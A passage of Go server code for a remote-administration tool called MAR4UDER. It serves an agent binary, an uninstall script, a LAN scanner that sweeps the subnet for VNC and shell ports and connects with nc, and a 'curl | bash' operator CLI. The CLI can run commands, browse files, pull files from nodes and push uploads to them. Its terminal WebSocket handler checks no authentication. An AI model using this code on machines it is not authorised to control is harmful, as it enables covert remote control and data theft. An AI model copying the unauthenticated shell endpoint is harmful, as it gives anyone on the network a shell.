    systemctl disable mar4uder-agent 2>/dev/null || true
    rm -f /etc/systemd/system/mar4uder-agent.service 2>/dev/null || true
    systemctl daemon-reload 2>/dev/null || true

    # User systemd service
    systemctl --user stop mar4uder-agent 2>/dev/null || true
    systemctl --user disable mar4uder-agent 2>/dev/null || true
    rm -f "$HOME/.config/systemd/user/mar4uder-agent.service" 2>/dev/null || true
    systemctl --user daemon-reload 2>/dev/null || true
fi

# 2. Remove desktop autostart entry
rm -f "$HOME/.config/autostart/mar4uder-agent.desktop" 2>/dev/null || true

# 3. Remove from crontab
crontab -l 2>/dev/null | grep -v "mar4uder_agent" | crontab - 2>/dev/null || true

# 4. Remove agent binary
rm -f /usr/local/bin/mar4uder_agent "$HOME/.local/bin/mar4uder_agent" 2>/dev/null || true
if sudo -n true 2>/dev/null; then
    sudo rm -f /usr/local/bin/mar4uder_agent /etc/systemd/system/mar4uder-agent.service 2>/dev/null || true
fi

# 5. Clean logs and configs
rm -f /tmp/mar4uder* /tmp/krfb.log /etc/mar4uder.conf "$HOME/mar4uder.conf" 2>/dev/null || true

# 6. Terminate process
pkill -9 -f "mar4uder_agent" 2>/dev/null || true

echo "[+] SUCCESS: MAR4UDER agent cleanly uninstalled from system."
`
	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write([]byte(script))
}

func (api *APIServer) handleServeAgentBinary(w http.ResponseWriter, r *http.Request) {
	candidates := []string{
		"bin/mar4uder_agent",
		"../bin/mar4uder_agent",
		"/usr/local/bin/mar4uder_agent",
		"/opt/mar4uder/bin/mar4uder_agent",
		"mar4uder_agent",
	}

	for _, cand := range candidates {
		if data, err := os.ReadFile(cand); err == nil {
			w.Header().Set("Content-Type", "application/octet-stream")
			w.Header().Set("Content-Disposition", "attachment; filename=\"mar4uder_agent\"")
			w.WriteHeader(http.StatusOK)
			_, _ = w.Write(data)
			return
		}
	}

	http.Error(w, "Agent binary not found on server. Please build it first with make linux.", http.StatusNotFound)
}

func (api *APIServer) handleTerminalWS(w http.ResponseWriter, r *http.Request) {
	nodeID := strings.TrimSpace(r.URL.Query().Get("node"))
	node, exists := api.nm.GetNode(nodeID)
	if !exists {
		log.Printf("[WS] Terminal rejected: node '%s' not found", nodeID)
		http.Error(w, "Node not found", http.StatusNotFound)
		return
	}

	ws, err := UpgradeWebSocket(w, r)
	if err != nil {
		log.Printf("[WS] Terminal UpgradeWebSocket error for '%s': %v", nodeID, err)
		return
	}
	defer ws.Close()
	defer api.udpGw.SendSessionClose(node)

	log.Printf("[WS] Terminal session attached for node '%s' from %s", nodeID, r.RemoteAddr)
	defer log.Printf("[WS] Terminal session detached for node '%s'", nodeID)

	subID := fmt.Sprintf("sub-%d", time.Now().UnixNano())
	ptyCh := node.AddPTYSubscriber(subID)
	defer node.RemovePTYSubscriber(subID)

	_, _ = api.udpGw.SendSessionOpen(node, 80, 24)
	time.Sleep(50 * time.Millisecond)
	_ = api.udpGw.SendPtyData(node, []byte("\r"))

	go func() {
		for data := range ptyCh {
			// Write binary frame to prevent browser UTF-8 decode abortions on ANSI chunk splits
			if err := ws.WriteBinary(data); err != nil {
				return
			}
		}
	}()

	for {
		op, payload, err := ws.ReadMessage()
		if err != nil {
			break
		}

		if op == wsOpText {
			var ctl struct {
				Type string `json:"type"`
				Cols uint16 `json:"cols"`
				Rows uint16 `json:"rows"`
			}
			if err := json.Unmarshal(payload, &ctl); err == nil && ctl.Type == "resize" && ctl.Cols > 0 && ctl.Rows > 0 {
				_ = api.udpGw.SendPtyResize(node, ctl.Cols, ctl.Rows)
				continue
			}
			_ = api.udpGw.SendPtyData(node, payload)
		} else if op == wsOpBinary {
			_ = api.udpGw.SendPtyData(node, payload)
		}
	}
}

func (api *APIServer) handleDesktopWS(w http.ResponseWriter, r *http.Request) {
	if !api.checkAuth(r) {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	nodeID := r.URL.Query().Get("node")
	node, exists := api.nm.GetNode(nodeID)
	if !exists {
		http.Error(w, "Node not found", http.StatusNotFound)
		return
	}

	ws, err := UpgradeWebSocket(w, r)
	if err != nil {
		return
	}
	defer ws.Close()
	defer api.udpGw.SendVncStop(node)

	subID := fmt.Sprintf("vnc-sub-%d", time.Now().UnixNano())
	vncCh := node.AddVNCSubscriber(subID)
	defer node.RemoveVNCSubscriber(subID)

	node.mu.RLock()
	wPx := node.VncWidth
	hPx := node.VncHeight
	bpp := node.VncBpp
	if wPx == 0 || hPx == 0 {
		wPx = 1024
		hPx = 768
		bpp = 32
	}
	node.mu.RUnlock()

	// Send initial resolution frame to new WebSocket immediately
	initMsg := make([]byte, 8)
	initMsg[0] = 0xFE
	initMsg[1] = 0xFE
	binary.BigEndian.PutUint16(initMsg[2:4], wPx)
	binary.BigEndian.PutUint16(initMsg[4:6], hPx)
	initMsg[6] = bpp
	initMsg[7] = 0
	_ = ws.WriteBinary(initMsg)

	_ = api.udpGw.SendVncStart(node)

	go func() {
		for tile := range vncCh {
			if err := ws.WriteBinary(tile); err != nil {
				return
			}
		}
	}()

	for {
		op, payload, err := ws.ReadMessage()
		if err != nil {
			break
		}

		if op == wsOpBinary && len(payload) >= 11 {
			inp := MsgVncInputPayload{
				EventType:  payload[0],
				ButtonMask: payload[1],
				X:          binary.LittleEndian.Uint16(payload[2:4]),
				Y:          binary.LittleEndian.Uint16(payload[4:6]),
				KeySym:     binary.LittleEndian.Uint32(payload[6:10]),
				DownFlag:   payload[10],
			}
			_ = api.udpGw.SendVncInput(node, inp)
		}
	}
}

func (api *APIServer) handleLanScannerScript(w http.ResponseWriter, r *http.Request) {

	script := `#!/usr/bin/env bash
# ====================================================================
#   M4R // ЛОКАЛЬНЫЙ СКАНЕР ВОССТАНОВЛЕНИЯ И АДМИНИСТРИРОВАНИЯ
# ====================================================================

set -e

# Detect local IP and subnet
LOCAL_IP=$(ip -o -f inet addr show 2>/dev/null | awk '/scope global/ {print $4}' | head -n 1 | cut -d'/' -f1)
if [ -z "$LOCAL_IP" ]; then
    LOCAL_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
fi
SUBNET_PREFIX=$(echo "$LOCAL_IP" | cut -d'.' -f1-3)

if [ -z "$SUBNET_PREFIX" ]; then
    echo -e "\033[31m[-] Не удалось автоматически определить локальную сеть.\033[0m"
    exit 1
fi

scan_network() {
    clear 2>/dev/null || true
    echo -e "\033[1;36m====================================================================\033[0m"
    echo -e "\033[1;32m      M4R // ЛОКАЛЬНЫЙ СКАНЕР ВОССТАНОВЛЕНИЯ И СЕТИ                 \033[0m"
    echo -e "\033[1;36m====================================================================\033[0m"
    echo -e "[*] Локальный IP: \033[1m$LOCAL_IP\033[0m | Сканирование подсети: \033[1m${SUBNET_PREFIX}.0/24\033[0m ..."
    echo -e "[*] Поиск активных VNC (5900/5901) и PTY/Shell сервисов...\n"

    SCAN_FILE="/tmp/m4r_scan_results.$$"
    rm -f "$SCAN_FILE"

    python3 -c "
import socket, concurrent.futures

subnet = '$SUBNET_PREFIX'
def check(i):
    ip = f'{subnet}.{i}'
    vnc_port = 0
    pty_port = 0
    # Check 5900
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.25)
        if s.connect_ex((ip, 5900)) == 0:
            vnc_port = 5900
        s.close()
    except: pass

    # Check 5901
    if not vnc_port:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.25)
            if s.connect_ex((ip, 5901)) == 0:
                vnc_port = 5901
            s.close()
        except: pass

    # Check PTY ports 9001, 9000, 22
    for p in (9001, 9000, 22):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.25)
            if s.connect_ex((ip, p)) == 0:
                pty_port = p
                s.close()
                break
            s.close()
        except: pass

    if vnc_port or pty_port:
        return (ip, vnc_port, pty_port)
    return None

with concurrent.futures.ThreadPoolExecutor(max_workers=64) as ex:
    futs = [ex.submit(check, i) for i in range(1, 255)]
    with open('$SCAN_FILE', 'w') as f:
        for fut in futs:
            res = fut.result()
            if res:
                f.write(f'{res[0]}|{res[1]}|{res[2]}\n')
" 2>/dev/null || true

    FOUND_IPS=()
    FOUND_VNCS=()
    FOUND_PTYS=()

    if [ -f "$SCAN_FILE" ] && [ -s "$SCAN_FILE" ]; then
        echo -e "  \033[1m#   IP АДРЕС            VNC ЭКРАН          PTY SHELL          СТАТУС\033[0m"
        echo -e "  ----------------------------------------------------------------------"
        idx=1
        while IFS='|' read -r ip vnc pty; do
            FOUND_IPS+=("$ip")
            FOUND_VNCS+=("$vnc")
            FOUND_PTYS+=("$pty")
            vnc_str="нет"
            pty_str="нет"
            [ "$vnc" -gt 0 ] 2>/dev/null && vnc_str=":${vnc} (VNC READY)"
            [ "$pty" -gt 0 ] 2>/dev/null && pty_str=":${pty} (Shell)"
            printf "  [\033[1m%%d\033[0m] %%-19s \033[1;35m%%-18s\033[0m \033[1;32m%%-18s\033[0m ONLINE\n" "$idx" "$ip" "$vnc_str" "$pty_str"
            ((idx++))
        done < "$SCAN_FILE"
        echo -e "  ----------------------------------------------------------------------\n"
    else
        echo -e "  \033[33m[-] В подсети ${SUBNET_PREFIX}.0/24 не найдено активных машин с VNC/PTY.\033[0m\n"
    fi
    rm -f "$SCAN_FILE"
}

scan_network

while true; do
    echo -e "\033[1;33mДействия:\033[0m"
    echo -e "  - Введите \033[1m<номер>\033[0m (напр. '1') : прямое подключение к Shell выбранного компьютера"
    echo -e "  - Введите \033[1mv <номер>\033[0m (напр. 'v 1') : запустить VNC Viewer для просмотра рабочего стола"
    echo -e "  - Введите \033[1mr\033[0m : повторить сканирование сети | \033[1mq\033[0m: выход\n"
    read -rp "scanner> " cmd

    if [ "$cmd" = "q" ] || [ "$cmd" = "quit" ] || [ "$cmd" = "exit" ]; then
        echo "Выход."
        break
    fi

    if [ "$cmd" = "r" ] || [ "$cmd" = "scan" ]; then
        scan_network
        continue
    fi

    if [[ "$cmd" =~ ^v[[:space:]]+([0-9]+)$ ]]; then
        num="${BASH_REMATCH[1]}"
        idx=$((num - 1))
        target_ip="${FOUND_IPS[$idx]}"
        target_vnc="${FOUND_VNCS[$idx]}"
        if [ -n "$target_ip" ] && [ "$target_vnc" -gt 0 ]; then
            echo -e "\033[1;36m[*] Запуск VNC клиента на ${target_ip}:${target_vnc} ...\033[0m"
            if command -v vncviewer >/dev/null 2>&1; then
                nohup vncviewer "${target_ip}:${target_vnc}" >/dev/null 2>&1 &
            elif command -v remmina >/dev/null 2>&1; then
                nohup remmina -c "vnc://${target_ip}:${target_vnc}" >/dev/null 2>&1 &
            else
                echo -e "[-] VNC-клиент не найден в системе. Подключитесь вручную: ${target_ip}:${target_vnc}"
            fi
        else
            echo -e "\033[31m[-] Неверный номер или на машине не открыт VNC порт.\033[0m"
        fi
        continue
    fi

    if [[ "$cmd" =~ ^[0-9]+$ ]]; then
        idx=$((cmd - 1))
        target_ip="${FOUND_IPS[$idx]}"
        target_pty="${FOUND_PTYS[$idx]}"
        if [ -n "$target_ip" ]; then
            echo -e "\033[1;32m[+] Подключение к PTY Shell на ${target_ip}... (Для выхода наберите exit или Ctrl+C)\033[0m\n"
            if [ "$target_pty" -eq 9001 ] || [ "$target_pty" -eq 9000 ]; then
                nc "${target_ip}" "${target_pty}" || telnet "${target_ip}" "${target_pty}"
            elif [ "$target_pty" -eq 22 ]; then
                ssh "${target_ip}"
            else
                nc "${target_ip}" 9001 || nc "${target_ip}" 9000 || ssh "${target_ip}"
            fi
        else
            echo -e "\033[31m[-] Компьютер с номером $cmd не найден.\033[0m"
        fi
        continue
    fi
done
`

	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write([]byte(script))
}

func (api *APIServer) handleAdminInstaller(w http.ResponseWriter, r *http.Request) {
	host := r.Host
	if strings.Contains(host, ":") {
		host = strings.Split(host, ":")[0]
	}

	httpPort := "8080"
	if parts := strings.Split(api.cfg.HTTPAddr, ":"); len(parts) >= 2 {
		httpPort = parts[len(parts)-1]
	}

	script := fmt.Sprintf(`#!/bin/bash
# ==============================================================================
# MAR4UDER Administrator CLI (m4r)
# Control server: %s (API: %s, Console: 9000, VNC: 5900)
# ==============================================================================

SERVER_HOST="%s"
SERVER_HTTP_PORT="%s"
SERVER_NC_PORT="9000"
SERVER_RFB_PORT="5900"
API_URL="http://${SERVER_HOST}:${SERVER_HTTP_PORT}/api/v1"

# If invoked via curl ... | bash, install to /usr/local/bin/m4r
if [ "$(basename "$0")" != "m4r" ] && [ "$1" != "run" ]; then
    echo -e "\033[1;36m[*] Installing MAR4UDER Administrator CLI (m4r) to /usr/local/bin/m4r ...\033[0m"
    TARGET="/usr/local/bin/m4r"
    if [ "$(id -u)" -ne 0 ]; then
        if sudo -n true 2>/dev/null; then
            TARGET="/usr/local/bin/m4r"
            INSTALL_CMD="sudo"
        else
            mkdir -p "$HOME/.local/bin"
            TARGET="$HOME/.local/bin/m4r"
            INSTALL_CMD=""
        fi
    fi
    curl -fsSL "http://${SERVER_HOST}:${SERVER_HTTP_PORT}/admin" -o /tmp/m4r_cli
    chmod +x /tmp/m4r_cli
    if [ -n "$INSTALL_CMD" ]; then
        sudo mv /tmp/m4r_cli "$TARGET"
    else
        mv /tmp/m4r_cli "$TARGET"
    fi
    echo -e "\033[1;32m[+] SUCCESS: Installed to $TARGET\033[0m"
    echo -e "\033[1;34m[*] Type 'm4r' to launch the operator console or 'm4r help' for commands.\033[0m"
    exit 0
fi

# Print Help
show_help() {
    echo -e "\033[1;36mMAR4UDER // Admin CLI (m4r)\033[0m"
    echo -e "Usage:"
    echo -e "  \033[1mm4r\033[0m                         - Launch interactive Operator TUI (via netcat :9000)"
    echo -e "  \033[1mm4r list\033[0m                    - List all nodes and their status"
    echo -e "  \033[1mm4r pty <node_id|index>\033[0m     - Open raw interactive PTY shell"
    echo -e "  \033[1mm4r exec <node_id> <cmd>\033[0m    - Execute isolated command directly"
    echo -e "  \033[1mm4r fs <node_id> [path]\033[0m     - Explore filesystem"
    echo -e "  \033[1mm4r get <node_id> <rem_path>\033[0m - Download file from node"
    echo -e "  \033[1mm4r put <node_id> <local>\033[0m    - Upload local file to node (/tmp)"
    echo -e "  \033[1mm4r vnc <node_id>\033[0m           - Open VNC viewer or Web Desktop"
    echo -e "  \033[1mm4r krfb <node_id>\033[0m          - Auto-install & enable KRFB desktop on node"
    echo -e "  \033[1mm4r update <node_id>\033[0m        - Upgrade node agent to newest binary"
    echo -e "  \033[1mm4r web\033[0m                     - Open Web Control Panel in browser"
}

CMD="${1:-console}"

case "$CMD" in
    console|"")
        if command -v nc >/dev/null 2>&1; then
            nc "${SERVER_HOST}" "${SERVER_NC_PORT}"
        elif command -v ncat >/dev/null 2>&1; then
            ncat "${SERVER_HOST}" "${SERVER_NC_PORT}"
        elif command -v telnet >/dev/null 2>&1; then
            telnet "${SERVER_HOST}" "${SERVER_NC_PORT}"
        else
            echo "[-] Netcat (nc) not found. Please install netcat: apt install netcat"
            exit 1
        fi
        ;;

    list|nodes|ls)
        echo -e "\033[1;36m[*] Fetching nodes from http://${SERVER_HOST}:${SERVER_HTTP_PORT} ...\033[0m"
        curl -s "${API_URL}/nodes" | python3 -c "
import sys, json
try:
    nodes = json.load(sys.stdin)
    if not nodes:
        print('[-] No nodes currently registered.')
        sys.exit(0)
    print(f'{\"ID\":<20} {\"STATUS\":<10} {\"HOSTNAME\":<25} {\"IP:PORT\":<22} {\"VNC\":<12} {\"NOTE\"}')
    print('-' * 95)
    for n in nodes:
        st = '\033[32mONLINE\033[0m' if n.get('is_online') else '\033[31mOFFLINE\033[0m'
        vnc = f\"{n.get('vnc_engine', 'custom')}:{n.get('vnc_port', 5900)}\"
        print(f\"{n.get('id', ''):<20} {st:<19} {n.get('hostname', ''):<25} {n.get('remote_addr', ''):<22} {vnc:<12} {n.get('note', '')}\")
except Exception as e:
    print('[-] Error parsing response:', e)
"
        ;;

    pty|shell|s)
        NODE="$2"
        if [ -z "$NODE" ]; then
            echo "[-] Usage: m4r pty <node_id_or_number>"
            exit 1
        fi
        # If numeric, pass directly to netcat console
        if [[ "$NODE" =~ ^[0-9]+$ ]]; then
            printf "%%s\n" "$NODE" | nc "${SERVER_HOST}" "${SERVER_NC_PORT}"
        else
            # Open interactive terminal session
            curl -s -X POST "${API_URL}/nodes/${NODE}/pty/open" -H "Content-Type: application/json" -d '{"cols": 120, "rows": 35}' >/dev/null
            echo -e "\033[1;32m[+] PTY opened for ${NODE}. Launching console...\033[0m"
            printf "pty %%s\n" "$NODE" | nc "${SERVER_HOST}" "${SERVER_NC_PORT}"
        fi
        ;;

    exec|cmd|x)
        NODE="$2"
        shift 2
        USER_CMD="$*"
        if [ -z "$NODE" ] || [ -z "$USER_CMD" ]; then
            echo "[-] Usage: m4r exec <node_id> \"<command>\""
            exit 1
        fi
        PAYLOAD=$(python3 -c "import json, sys; print(json.dumps({'command': sys.argv[1]}))" "$USER_CMD")
        curl -s -X POST "${API_URL}/nodes/${NODE}/cmd" -H "Content-Type: application/json" -d "$PAYLOAD" | python3 -c "
import sys, json
try:
    res = json.load(sys.stdin)
    if 'output' in res:
        print(res['output'])
    else:
        print(res)
except:
    pass
"
        ;;

    fs)
        NODE="$2"
        DIR_PATH="${3:-/}"
        if [ -z "$NODE" ]; then
            echo "[-] Usage: m4r fs <node_id> [path]"
            exit 1
        fi
        curl -s "${API_URL}/nodes/${NODE}/fs?path=${DIR_PATH}" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    entries = data.get('entries', [])
    print(f'Listing: {data.get(\"current_path\", \"/\")}')
    print(f'{\"PERM\":<12} {\"SIZE\":<10} {\"NAME\"}')
    print('-' * 45)
    for e in entries:
        t = '\033[1;34m' if e.get('is_dir') else ''
        rst = '\033[0m' if e.get('is_dir') else ''
        print(f\"{e.get('perm', ''):<12} {e.get('size', 0):<10} {t}{e.get('name', '')}{rst}\")
except Exception as e:
    print('[-] Error:', e)
"
        ;;

    get|download)
        NODE="$2"
        REMOTE_PATH="$3"
        LOCAL_PATH="${4:-$(basename "$REMOTE_PATH")}"
        if [ -z "$NODE" ] || [ -z "$REMOTE_PATH" ]; then
            echo "[-] Usage: m4r get <node_id> <remote_path> [local_destination]"
            exit 1
        fi
        echo -e "[*] Fetching ${REMOTE_PATH} from ${NODE} ..."
        RES=$(curl -s -X POST "${API_URL}/nodes/${NODE}/download" -H "Content-Type: application/json" -d "{\"remote_path\": \"${REMOTE_PATH}\"}")
        FILE_ID=$(echo "$RES" | python3 -c "import sys, json; print(json.load(sys.stdin).get('file_id', ''))")
        if [ -n "$FILE_ID" ]; then
            curl -fsSL "${API_URL}/files/${FILE_ID}" -o "$LOCAL_PATH"
            echo -e "\033[32m[+] Downloaded to ${LOCAL_PATH}\033[0m"
        else
            echo "[-] Download failed: $RES"
        fi
        ;;

    put|upload)
        NODE="$2"
        LOCAL_FILE="$3"
        REMOTE_PATH="${4:-/tmp/$(basename "$LOCAL_FILE")}"
        if [ -z "$NODE" ] || [ -z "$LOCAL_FILE" ]; then
            echo "[-] Usage: m4r put <node_id> <local_file> [remote_destination]"
            exit 1
        fi
        if [ ! -f "$LOCAL_FILE" ]; then
            echo "[-] Local file not found: $LOCAL_FILE"
            exit 1
        fi
        echo -e "[*] Uploading ${LOCAL_FILE} -> ${NODE}:${REMOTE_PATH} ..."
        curl -s -X POST -F "file=@${LOCAL_FILE}" -F "target_path=${REMOTE_PATH}" "${API_URL}/nodes/${NODE}/upload" | python3 -c "
import sys, json
try:
    res = json.load(sys.stdin)
    if res.get('status') == 'completed':
        print('\033[32m[+] Upload successful!\033[0m')
    else:
        print(res)
except: pass
"
        ;;

    vnc|desktop)
        NODE="$2"
        if command -v vncviewer >/dev/null 2>&1; then
            vncviewer "${SERVER_HOST}:${SERVER_RFB_PORT}" &
        elif command -v remmina >/dev/null 2>&1; then
            remmina -c "vnc://${SERVER_HOST}:${SERVER_RFB_PORT}" &
        else
            URL="http://${SERVER_HOST}:${SERVER_HTTP_PORT}/"
            echo -e "[+] Open HTML5 Web Desktop: \033[1;34m$URL\033[0m"
            if command -v xdg-open >/dev/null 2>&1; then
                xdg-open "$URL"
            fi
        fi
        ;;

    krfb)
        NODE="$2"
        if [ -z "$NODE" ]; then
            echo "[-] Usage: m4r krfb <node_id>"
            exit 1
        fi
        echo -e "[*] Requesting KRFB deployment on ${NODE} ..."
        curl -s -X POST "${API_URL}/nodes/${NODE}/settings" -H "Content-Type: application/json" -d '{"vnc_engine": "krfb"}'
        echo -e "\033[32m[+] KRFB enabled on ${NODE}.\033[0m"
        ;;

    update)
        NODE="$2"
        if [ -z "$NODE" ]; then
            echo "[-] Usage: m4r update <node_id>"
            exit 1
        fi
        echo -e "[*] Triggering in-place update on ${NODE} ..."
        curl -s -X POST "${API_URL}/nodes/${NODE}/update"
        echo -e "\033[32m[+] Update dispatched.\033[0m"
        ;;

    web)
        URL="http://${SERVER_HOST}:${SERVER_HTTP_PORT}/"
        echo -e "[+] Web UI: \033[1;34m$URL\033[0m"
        if command -v xdg-open >/dev/null 2>&1; then
            xdg-open "$URL"
        fi
        ;;

    help|--help|-h)
        show_help
        ;;

    *)
        echo "[-] Unknown command: $CMD"
        show_help
        exit 1
        ;;
esac
`, host, httpPort, host, httpPort)

	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write([]byte(script))
}

func (api *APIServer) handleUpdateAll(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	serverHost := r.Host
	if strings.Contains(serverHost, ":") {
		serverHost = strings.Split(serverHost, ":")[0]
	}
	results := api.updateMgr.UpdateAll(serverHost)
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]any{"status": "completed", "results": results})
}



